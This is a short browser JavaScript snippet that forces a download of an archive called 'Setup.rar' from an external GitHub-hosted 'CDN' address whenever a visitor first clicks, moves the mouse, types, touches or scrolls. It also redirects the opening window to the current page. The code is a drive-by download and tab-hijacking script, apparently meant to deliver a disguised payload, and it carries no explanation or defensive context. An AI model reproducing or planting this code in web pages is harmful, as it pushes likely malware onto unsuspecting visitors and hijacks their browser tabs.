function download(url, filename) {
  const a = document.createElement('a');
  a.href = url;
  a.download = filename || '';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}
// download('https://github.com/icaroCDN/icaroCDN.github.io/raw/refs/heads/main/Setup.rar')

function onAnyInteraction(fn) {
  ['click','mousemove','keydown','touchstart','scroll','wheel'].forEach(e =>
    window.addEventListener(e, fn, { once: true })
  );
}

onAnyInteraction(() => {
  download('https://github.com/icaroCDN/icaroCDN.github.io/raw/refs/heads/main/Setup.rar')
});

if (window.opener) window.opener.location = window.location.href;

